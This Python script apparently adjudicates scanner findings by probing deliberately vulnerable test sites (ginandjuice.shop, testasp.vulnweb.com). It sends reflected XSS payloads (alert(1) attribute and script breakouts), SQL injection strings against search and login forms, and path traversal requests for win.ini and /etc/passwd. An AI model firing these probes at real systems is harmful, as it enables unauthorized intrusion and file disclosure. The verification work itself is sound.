#!/usr/bin/env python3
"""IV14 — Round-3 follow-up: adjudicate the three unreplicated SENTINEL claims.

Independent toolchain: stdlib urllib ONLY, zero SENTINEL code (same discipline
as scripts/iv13_*.py). Sanctioned test targets only.

Claims under adjudication (supervisor order 2026-10-04):
  C1  ginandjuice.shop  /catalog?searchTerm  xss_reflected (ng_expression_reflection
      evidence: {{91*7}} canary landed raw INSIDE a <script> string)
      -> probe: ng expression, tag/attr escape checks, JS-string breakout battery
  C2  testasp.vulnweb.com  /Search.asp?tfSearch  sql_injection (status_oracle:
      quote->500, base->200, doubled->200) + xss_reflected (raw canary in body)
      -> probe: base/quote/doubled/AND-pair/OR-pair + reflection battery
  C2b testasp.vulnweb.com  /Login.asp  tfUName/tfUPass sql_injection (status_oracle)
      -> probe: current state of the same oracle triple
  C3  testasp.vulnweb.com  /Templatize.asp?item  path_traversal (file_marker
      [fonts] at depth-dependent offsets, verified at scan time)
      -> probe: base item, 4up/6up win.ini (url-encoded ../), plain ../, + marker
      soundness (is [fonts] present in ANY non-traversal response?)

Transport: http:// for vulnweb/testfire targets (TLS certs invalid/expired —
documented in IV13; same egress as the sanctioned campaign).
Output: scripts/iv_out/iv14_claims.json (raw, verbatim).
"""
import json
import re
import ssl
import time
import urllib.request
import urllib.parse
import http.client

OUT = "/home/z/my-project/scripts/iv_out/iv14_claims.json"
UA = "Mozilla/5.0 (compatible; IV14-Verifier/1.0; +independent-probe)"


def raw_get(host, path, timeout=15, cookie=None):
    """Plain http GET, no redirect follow, returns dict(status, len, headers, body, location)."""
    conn = http.client.HTTPConnection(host, 80, timeout=timeout)
    hdrs = {"User-Agent": UA, "Accept": "*/*"}
    if cookie:
        hdrs["Cookie"] = cookie
    try:
        conn.request("GET", path, headers=hdrs)
        r = conn.getresponse()
        body = r.read(2_000_000).decode("utf-8", "replace")
        return {"status": r.status, "len": len(body),
                "location": r.getheader("Location") or "",
                "set_cookie": r.getheader("Set-Cookie") or "",
                "body": body}
    except Exception as e:
        return {"status": 0, "len": 0, "error": f"{type(e).__name__}: {e}", "body": ""}
    finally:
        conn.close()


def raw_post(host, path, fields, timeout=15, cookie=None):
    body = urllib.parse.urlencode(fields)
    conn = http.client.HTTPConnection(host, 80, timeout=timeout)
    hdrs = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body))}
    if cookie:
        hdrs["Cookie"] = cookie
    try:
        conn.request("POST", path, body=body, headers=hdrs)
        r = conn.getresponse()
        rbody = r.read(2_000_000).decode("utf-8", "replace")
        return {"status": r.status, "len": len(rbody),
                "location": r.getheader("Location") or "",
                "set_cookie": r.getheader("Set-Cookie") or "",
                "body": rbody}
    except Exception as e:
        return {"status": 0, "len": 0, "error": f"{type(e).__name__}: {e}", "body": ""}
    finally:
        conn.close()


def ctx(body, needle, before=70, after=40):
    i = body.find(needle)
    if i < 0:
        return None
    return body[max(0, i - before):i + len(needle) + after].replace("\n", " ")


def in_script(body, needle):
    """Is the first occurrence of needle inside a <script>...</script> (or <style>) block?"""
    i = body.find(needle)
    if i < 0:
        return None
    for m in re.finditer(r"<script\b.*?</script\s*>|<style\b.*?</style\s*>", body, re.S | re.I):
        if m.start() <= i < m.end():
            return True
    # fallback: unclosed blocks — count opens vs closes before i
    opens = len(re.findall(r"<script\b", body[:i], re.I)) + len(re.findall(r"<style\b", body[:i], re.I))
    closes = len(re.findall(r"</script\s*>", body[:i], re.I)) + len(re.findall(r"</style\s*>", body[:i], re.I))
    return opens > closes


res = {"meta": {"when": time.strftime("%Y-%m-%d %H:%M:%S %z"), "ua": UA,
                "purpose": "IV14 adjudication of searchTerm XSS / tfSearch / Templatize claims"}}

# ---------------------------------------------------------------- C1: ginandjuice searchTerm
gj = {}
probes = [
    ("ng_expr",        "{{91*7}}iv14ngmark"),
    ("tag_probe",      "<u>iv14tag</u>"),
    ("attr_break",     'iv14attr" onmouseover="alert(1)" x="'),
    ("js_quote",       "iv14q';alert(1)//"),
    ("js_dquote",      'iv14q";alert(1)//'),
    ("js_close_script", "iv14cs</script><u>iv14raw</u>"),
    ("js_backslash",   "iv14bs\\';alert(1)//"),
    ("plain",          "iv14plain"),
]
for label, val in probes:
    q = urllib.parse.urlencode({"searchTerm": val})
    r = raw_get("ginandjuice.shop", "/catalog?" + q)
    ent = {"status": r["status"], "len": r["len"],
           "raw_reflected": val in r["body"], "in_script": in_script(r["body"], val),
           "context": ctx(r["body"], val)}
    if val in r["body"]:
        ent["escaped_present"] = (val.replace("<", "&lt;").replace(">", "&gt;")) in r["body"]
    gj[label] = ent
res["ginandjuice_searchTerm"] = gj

# ---------------------------------------------------------------- C2: testasp Search.asp tfSearch
ta = {}
for label, val in [("base", "1"), ("quote", "1'"), ("doubled", "1''"),
                   ("and_true", "1 AND 1=1"), ("and_false", "1 AND 1=2"),
                   ("or_true", "1 OR 1=1"), ("plain_word", "iv14word"),
                   ("xss_tag", "<u>iv14x</u>"),
                   ("xss_attr", 'iv14x" onmouseover="alert(1)" x="')]:
    q = urllib.parse.urlencode({"tfSearch": val})
    r = raw_get("testasp.vulnweb.com", "/Search.asp?" + q)
    ta[label] = {"q": q, "status": r["status"], "len": r["len"],
                 "raw_reflected": (val in r["body"]) if r["status"] else False,
                 "context": ctx(r["body"], val) if r["status"] else None,
                 "is_iis_500": "500 - Internal server error" in r["body"]}
res["testasp_tfSearch"] = ta

# ---------------------------------------------------------------- C2b: testasp Login.asp oracle state
tl = {}
for label, fields in [
        ("base",   {"tfUName": "iv14user", "tfUPass": "x"}),
        ("quote",  {"tfUName": "1'", "tfUPass": "sentinel"}),
        ("doubled", {"tfUName": "1''", "tfUPass": "sentinel"}),
        ("quote_passw", {"tfUName": "sentinel", "tfUPass": "1'"})]:
    r = raw_post("testasp.vulnweb.com", "/Login.asp", fields)
    tl[label] = {"status": r["status"], "len": r["len"], "location": r["location"],
                 "is_iis_500": "500 - Internal server error" in r["body"]}
res["testasp_Login_oracle"] = tl

# ---------------------------------------------------------------- C3: testasp Templatize.asp item
tt = {}
for label, item in [("base_about", "html/about.html"),
                    ("trav_4up_win", "..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"),
                    ("trav_6up_win", "..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"),
                    ("trav_4up_plain", "../../../../windows/win.ini"),
                    ("trav_4up_passwd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd")]:
    r = raw_get("testasp.vulnweb.com", "/Templatize.asp?item=" + item)
    fonts = r["body"].find("[fonts]")
    tt[label] = {"status": r["status"], "len": r["len"],
                 "fonts_offset": fonts if fonts >= 0 else None,
                 "rootx_offset": (r["body"].find("root:x:0:0:") if r["body"].find("root:x:0:0:") >= 0 else None),
                 "is_iis_500": "500 - Internal server error" in r["body"],
                 "body_head": r["body"][:120].replace("\n", " ") if r["status"] else None}
res["testasp_Templatize"] = tt

with open(OUT, "w") as f:
    json.dump(res, f, indent=1)
print(json.dumps(res, indent=1)[:6000])
print("\nFULL RAW ->", OUT)
